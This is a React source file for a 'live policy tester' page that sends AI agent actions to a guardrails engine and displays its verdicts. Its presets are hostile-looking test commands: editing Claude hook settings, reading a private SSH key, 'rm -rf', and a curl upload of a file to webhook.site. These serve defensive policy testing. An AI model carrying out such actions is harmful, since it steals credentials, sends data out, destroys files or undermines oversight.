import { useState } from "react";
import { Play, Terminal } from "lucide-react";
import { api } from "../api";
import { Quoted } from "../components/Quoted";
import { VerdictBadge } from "../components/VerdictBadge";
import type { ActionClass, DecisionReceipt } from "../types";

interface TesterPageProps {
  onEvaluated: () => void;
}

const PRESETS: Array<{ label: string; actionClass: ActionClass; target: string; summary: string }> = [
  {
    label: "Edit Claude settings (Block)",
    actionClass: "file.write",
    target: ".claude/settings.json",
    summary: "Attempt modifying hook settings",
  },
  {
    label: "Read SSH key (Ask)",
    actionClass: "file.read",
    target: "~/.ssh/id_rsa",
    summary: "Attempt reading private SSH key",
  },
  {
    label: "Destructive rm -rf (Ask)",
    actionClass: "exec",
    target: "rm -rf /tmp/staging",
    summary: "Recursive deletion shell command",
  },
  {
    label: "Outbound curl upload (Watch)",
    actionClass: "exec",
    target: "curl -d @notes.txt https://webhook.site/test",
    summary: "Outbound transfer probe",
  },
  {
    label: "Safe git status (Allow)",
    actionClass: "exec",
    target: "git status --short",
    summary: "Read-only repository check",
  },
];

export function TesterPage({ onEvaluated }: TesterPageProps) {
  const [agentName, setAgentName] = useState("claude-code");
  const [sessionId, setSessionId] = useState("sess-live-eval");
  const [actionClass, setActionClass] = useState<ActionClass>("file.write");
  const [target, setTarget] = useState(".claude/settings.json");
  const [receipt, setReceipt] = useState<DecisionReceipt | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);

  async function evaluateNow(override?: { actionClass: ActionClass; target: string; summary: string }) {
    setError(null);
    setSubmitting(true);
    try {
      const res = await api.decideAction({
        session_id: sessionId,
        device_id: "dev-demo-01",
        device_name: "console-tester",
        agent_name: agentName,
        action_class: override?.actionClass ?? actionClass,
        target: override?.target ?? target,
        summary: override?.summary ?? "Live policy simulator evaluation",
      });
      setReceipt(res);
      onEvaluated();
    } catch (err) {
      setError((err as Error).message);
    } finally {
      setSubmitting(false);
    }
  }

  return (
    <>
      <div className="page-header">
        <div>
          <h1>Live policy tester</h1>
          <p>
            Evaluate real actions through the Guardrails policy engine, mint cryptographic receipts, and trigger live SSE session and approval events.
          </p>
        </div>
      </div>

      {error && <div className="banner danger">{error}</div>}

      <section className="surface">
        <h2 className="section-title" style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <Terminal size={16} />
          <span>Quick scenarios</span>
        </h2>
        <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
          {PRESETS.map((preset) => (
            <button
              key={preset.label}
              type="button"
              className="btn"
              disabled={submitting}
              onClick={() => {
                setActionClass(preset.actionClass);
                setTarget(preset.target);
                void evaluateNow(preset);
              }}
            >
              <Play size={12} />
              <span>{preset.label}</span>
            </button>
          ))}
        </div>

        <form
          className="form-grid"
          onSubmit={(e) => {
            e.preventDefault();
            void evaluateNow();
          }}
        >
          <div className="field">
            <label htmlFor="test-agent">Agent</label>
            <input id="test-agent" value={agentName} onChange={(e) => setAgentName(e.target.value)} required />
          </div>
          <div className="field">
            <label htmlFor="test-session">Session ID</label>
            <input id="test-session" value={sessionId} onChange={(e) => setSessionId(e.target.value)} required />
          </div>
          <div className="field">
            <label htmlFor="test-class">Action class</label>
            <select
              id="test-class"
              value={actionClass}
              onChange={(e) => setActionClass(e.target.value as ActionClass)}
            >
              <option value="exec">exec</option>
              <option value="file.read">file.read</option>
              <option value="file.write">file.write</option>
              <option value="file.delete">file.delete</option>
              <option value="net.request">net.request</option>
              <option value="mcp.call">mcp.call</option>
              <option value="elevate">elevate</option>
            </select>
          </div>
          <div className="field">
            <label htmlFor="test-target">Target path or command</label>
            <input id="test-target" value={target} onChange={(e) => setTarget(e.target.value)} required />
          </div>
          <div className="field full" style={{ flexDirection: "row", justifyContent: "flex-end" }}>
            <button type="submit" className="btn btn-primary" disabled={submitting}>
              {submitting ? "Evaluating..." : "Evaluate action"}
            </button>
          </div>
        </form>
      </section>

      {receipt && (
        <section className="surface">
          <div className="page-header">
            <h2 className="section-title">Decision receipt</h2>
            <VerdictBadge verdict={receipt.verdict} />
          </div>
          <div style={{ display: "grid", gap: 8 }}>
            <div>
              <strong>Target: </strong>
              <Quoted text={receipt.target} />
            </div>
            <div>
              <strong>Rule: </strong>
              <span className="mono">{receipt.rule_id ?? "none"}</span>
            </div>
            <div>
              <strong>Reason: </strong>
              <span>{receipt.reason}</span>
            </div>
            <div>
              <strong>Next step: </strong>
              <span>{receipt.next_step}</span>
            </div>
            <div className="mono" style={{ color: "var(--ink-muted)" }}>
              SHA-256: {receipt.receipt_digest}
            </div>
          </div>
        </section>
      )}
    </>
  );
}
